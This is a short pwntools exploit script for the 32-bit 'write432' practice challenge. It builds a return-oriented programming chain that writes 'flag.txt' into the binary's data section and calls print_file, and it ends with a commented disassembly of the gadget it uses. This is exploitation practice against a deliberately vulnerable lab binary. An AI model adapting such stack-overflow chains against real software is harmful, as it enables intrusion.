from pwn import *

exe = ELF('./write432')
context.binary = exe
context.log_level = 'info'

libc = ELF('./write432')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)


offset = 44 #pattern search $eip

call_printfile = exe.plt['print_file']

data = 0x804a018
data1 = 0x804a01c

flag = b'flag'
flag1 = b'.txt'

pop_edi_ebp = 0x080485aa 

usefulGadgets = 0x08048543

padding = b'BBBB'


payload = flat({offset:[pop_edi_ebp,
                        data,
                        flag,
                        usefulGadgets,
                        pop_edi_ebp,
                        data1,
                        flag1,
                        usefulGadgets,
                        call_printfile,
                        padding,
                        data]})

io.sendline(payload)

io.interactive()




'''

gef➤  disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:	mov    DWORD PTR [edi],ebp
   0x08048545 <+2>:	ret
   0x08048546 <+3>:	xchg   ax,ax
   0x08048548 <+5>:	xchg   ax,ax
   0x0804854a <+7>:	xchg   ax,ax
   0x0804854c <+9>:	xchg   ax,ax
   0x0804854e <+11>:	xchg   ax,ax
End of assembler dump.
gef➤  

'''